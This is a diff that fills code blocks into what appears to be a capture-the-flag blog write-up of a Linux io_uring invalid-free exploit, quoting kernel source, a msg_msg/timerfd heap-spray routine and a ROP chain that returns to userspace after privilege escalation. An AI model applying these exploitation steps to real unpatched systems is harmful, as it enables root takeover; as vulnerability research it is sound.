@@ -40,14 +40,36 @@ This blog will only focus on the relevant parts in `io_uring`. For a more detail
 The bug is about a false assumption on what task the function `__io_req_init_async` can be run in.  
 As you can see in the following vulnerable code:
 
-    1234567
+``` plaintext
+static inline void io_req_init_async(struct io_kiocb *req)
+{
+	struct io_uring_task *tctx = current->io_uring;
+	...
+	req->work.identity = tctx->identity;
+	...
+}
+```
 
 It assumes the `req` (the IO operation request) is submitted by itself (`current`), so it assigns its own `identity` to the request’s work.
 
 However, this assumption is wrong. If two tasks (threads) try to submit IO requests to the same io_uring at the same time, the two requests may be submitted into one work queue and associated with different request tasks, which is by design and expected.  
 If one of the threads is trying to exit (for example, by calling execve) when `IORING_SETUP_IOPOLL` is enabled, that specific thread will try to reap all the IO events in the work queue (make sure they finish) as shown below.
 
-    12345678910111213
+``` plaintext
+static int io_do_iopoll(struct io_ring_ctx *ctx, unsigned int *nr_events,
+			long min)
+{
+	LIST_HEAD(done);
+
+	list_for_each_entry_safe(req, tmp, &ctx->iopoll_list, inflight_entry) {
+		...
+		/* iopoll may have completed current req */
+		if (READ_ONCE(req->iopoll_completed))
+			list_move_tail(&req->inflight_entry, &done);
+	}
+	if (!list_empty(&done))
+		io_iopoll_complete(ctx, nr_events, &done);
+```
 
 But if IO events are not finished, `io_uring` will attempt to reissue the request and try its best to finish the request (the `io_iopoll_complete` call above).  
 However, this time, the new request is initialized (in `io_req_init_async`, invoked in a deep call chain from `io_iopoll_complete`) in the thread that tries to exit, which may be different from the threads that issued the original requests.
@@ -56,13 +78,33 @@ As a result, in `io_req_init_async`, `current->io_uring` (the exiting thread’s
 
 Later, when the kernel finishes the IO event and tries to destroy all the io_uring related objects, it will use `io_put_identify(req->task->io_uring, req)` for this purpose. Notice this time, it uses the submitter’s `io_uring` context (`req->task->io_uring`) in `io_put_identify`:
 
-    1234567
+``` plaintext
+static void io_put_identity(struct io_uring_task *tctx, struct io_kiocb *req)
+{
+	if (req->work.identity == &tctx->__identity)
+		return;
+	if (refcount_dec_and_test(&req->work.identity->count))
+		kfree(req->work.identity);
+}
+```
 
 Notice that previously, `req->work.identity` is assigned to the exiting thread’s identity and here `tctx` is the request submitter’s `io_uring` context.  
 Because `tctx->identity` is `&tctx->__identity` (`identity` is a pointer pointing to `__identity`, which is the identity struct embeded in `struct io_uring_task`), `req->work.identity != &tctx->__identity`.  
 Hence, the kernel thinks `req->work.identity` is a heap object and tries to free it while in reality, it is a pointer to the middle of the exiting thread’s `struct io_uring_task` as shown below:
 
-    1234567891011
+``` plaintext
+struct io_uring_task {
+	/* submission side */
+	struct xarray		xa;
+	struct wait_queue_head	wait;
+	struct file		*last;
+	struct percpu_counter	inflight;
+	struct io_identity	__identity;
+	struct io_identity	*identity;
+	atomic_t		in_idle;
+	bool			sqpoll;
+};
+```
 
 In other words, the whole process triggers a type confusion that makes the kernel think `req->work.identity` is a heap object and tries to free it while it is a pointer to the middle of a `io_uring_task` object.  
 In other words, it triggers an invalid-free.
@@ -135,7 +177,25 @@ With this heap layout, leaking both heap address and KASLR is easy:
 
 there are a few linked list struct embeded in it `struct timerfd_ctx` as shown below:
 
-    1234567891011121314151617
+``` plaintext
+struct timerfd_ctx {
+	union {
+		struct hrtimer tmr;
+		struct alarm alarm;
+	} t;
+	ktime_t tintv;
+	ktime_t moffs;
+	wait_queue_head_t wqh;
+	u64 ticks;
+	int clockid;
+	short unsigned expired;
+	short unsigned settime_flags;	/* to show in fdinfo */
+	struct rcu_head rcu;
+	struct list_head clist;
+	spinlock_t cancel_lock;
+	bool might_cancel;
+};
+```
 
 When those list struct are empty, they contain pointers pointing back to itself. As a result, we know where the timerfd object is in kernel heap.
 
@@ -162,7 +222,18 @@ Now let’s continue.
 
 The target kernel has `CONFIG_SLAB_FREELIST_HARDENED` enabled, which means the freelist in the kernel will be encoded as follow:
 
-    12345678910
+``` plaintext
+static inline void *freelist_ptr(const struct kmem_cache *s, void *ptr,
+				 unsigned long ptr_addr)
+{
+#ifdef CONFIG_SLAB_FREELIST_HARDENED
+	return (void *)((unsigned long)ptr ^ s->random ^
+			swab((unsigned long)(void *)ptr_addr);
+#else
+    return ptr;
+#endif
+}
+```
 
 kileak demonstrated \[5\] that if we know `ptr_addr` (the address the forward pointer is stored at), `ptr` (the forward pointer itself), and the encoded value, then we can calculate `s->random` and forge any encoded value and hijack the slab freelist just like before and obtain arbitrary write.
 
@@ -179,7 +250,38 @@ Anyway, my solution was to overwrite binfmt and then ROP. I have never seen anyb
 
 The way Linux loads executables is to go through a list of binfmt called `formats` \[6\], and use each binfmt’s `load_binary` handler \[7\] to see whether the the executable is recognizable by any of the format. If the executable is not recognizable by any of the format, it will try to load corresponding kernel modules (thus enables the `modprobe_path` exploitation technique). The logic exists in `search_binary_handler` as shown below:
 
-    123456789101112131415161718192021222324252627282930
+``` plaintext
+static int search_binary_handler(struct linux_binprm *bprm)
+{
+	...
+
+	read_lock(&binfmt_lock);
+	list_for_each_entry(fmt, &formats, lh) {
+		if (!try_module_get(fmt->module))
+			continue;
+		read_unlock(&binfmt_lock);
+
+		retval = fmt->load_binary(bprm);
+
+		read_lock(&binfmt_lock);
+		put_binfmt(fmt);
+		if (bprm->point_of_no_return || (retval != -ENOEXEC)) {
+			read_unlock(&binfmt_lock);
+			return retval;
+		}
+	}
+	read_unlock(&binfmt_lock);
+
+	if (need_retry) {
+		...
+		if (request_module("binfmt-%04x", *(ushort *)(bprm->buf + 2)) < 0)
+			return retval;
+		...
+	}
+
+	return retval;
+}
+```
 
 Most importantly, these binfmt structures are writable!!!
 
@@ -275,7 +377,32 @@ I tested all the hypothesis one by one. After ruling out the impossible, the one
 
 Now I knew the root cause of the crash, but to fix it, I needed to be able to debug it. But, my environment is totally different from kCTF’s. To solve the problem, I changed the search algorithm a little bit: I’ll try to allocate timerfd one by one and check whether the content in the `msg_msgseg` at the lower slot is changed. Once I get a hit, I’ll spray a lot of `msg_msg` as shown below:
 
-    123456789101112131415161718192021222324
+``` plaintext
+int _search_for_victim()
+{
+	...
+    for(int i=0; i<SPRAY_MAX; i++) {
+        // overwrite the invalid slot 
+        tfd = timerfd_create(CLOCK_REALTIME, 0); 
+
+        ret = msgrcv(lower_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
+        u64 magic = *(u64 *)&buffer[0x1040];
+        if(magic == 0xdead4ead00000000) {
+            // mid_tfd = timerfd_create(CLOCK_REALTIME, 0);
+            mid_tfd = tfd;
+            int msgqid = msgqids[i];
+            // iron out the weird freelist
+            for(int i=0; i<0x10; i++) assert(msgsnd(msgqid, buffer, 0xc1-0x30, IPC_NOWAIT) >= 0); 
+            heap_addr = *(u64 *)&buffer[0x1000] - 0x130;
+
+            printf("mid_tfd: %d, upper_msgqid: %d\n", mid_tfd, upper_msgqid);
+            return 1;
+        }
+    }
+	...
+    return 0;
+}
+```
 
 This way:
 
@@ -332,7 +459,13 @@ The issue is that we can’t return back to userspace easily (I suspect the issu
 
 The idea of my approach, aka telefork, is simple: instead of trying to handle the CPU privilege ring stuff ourselves, we let the kernel do the work for us by simply calling `fork` and then `msleep`. The payload that I used is shown as follow:
 
-    12345
+``` plaintext
+// return back to userspace
+rop[idx++] = kaslr_slide + 0xffffffff8107ed20; // fork
+rop[idx++] = kaslr_slide + 0xffffffff81076990; //: pop rdi; ret;
+rop[idx++] = 0x1000000;
+rop[idx++] = kaslr_slide + 0xffffffff81112710; // msleep
+```
 
 Basically, `fork` will extract the userspace return address of the current syscall and assign the value to the newly created task. (This is equivalent to how it works but not exactly how it works, interested readers can look up `ret_from_fork`).  
 After that, the old task will sleep forever because of the `msleep` call and the newly created task will directly start execution from the extracted return address in userspace. Since we already finish privilege escalation before calling `fork`, the newly created task also has root privilege.
